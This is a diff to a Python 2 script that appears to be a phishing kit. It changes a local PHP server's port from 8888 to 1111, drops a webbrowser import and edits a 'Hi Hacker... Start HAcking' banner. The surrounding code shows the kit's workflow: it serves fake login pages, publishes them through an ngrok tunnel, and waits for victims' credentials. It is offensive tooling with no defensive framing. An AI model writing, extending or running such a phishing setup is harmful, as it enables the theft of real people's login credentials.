@@ -12,7 +12,7 @@ import multiprocessing
 from urllib import urlopen
 from platform import system as systemos, architecture
 from wget import download
-import webbrowser
+
 
 RED, WHITE, CYAN, GREEN, END = '\033[91m', '\33[46m', '\033[36m', '\033[1;32m', '\033[0m'
 
@@ -117,7 +117,7 @@ def runPhishing(social, option2):
          
         
 def waitCreds():
-    print " \n {0}[{1}*{0}]{1} Hi Hacker Everything has been completed.............. Start HAcking ".format(RED, END) 
+    print "{0}[{1}*{0}]{1} Hi Hacker Everything has been completed.............. Start HAcking ".format(RED, END) 
   
     print '''{0}
    _.-=-._     .-, 
@@ -249,7 +249,7 @@ def runPEnv():
         exit(0)
 
 def runNgrok():
-    system('./Server/ngrok http 8888 > /dev/null &')
+    system('./Server/ngrok http 1111 > /dev/null &')
     sleep(10)
     system('curl -s -N http://127.0.0.1:4040/status | grep "https://[0-9a-z]*\.ngrok.io" -oh > ngrok.url')
     url = open('ngrok.url', 'r')
@@ -257,7 +257,7 @@ def runNgrok():
     url.close()
 
 def runServer():
-    system("cd Server/www/ && sudo php -S 127.0.0.1:8888")
+    system("cd Server/www/ && sudo php -S 127.0.0.1:1111")
 
 
 
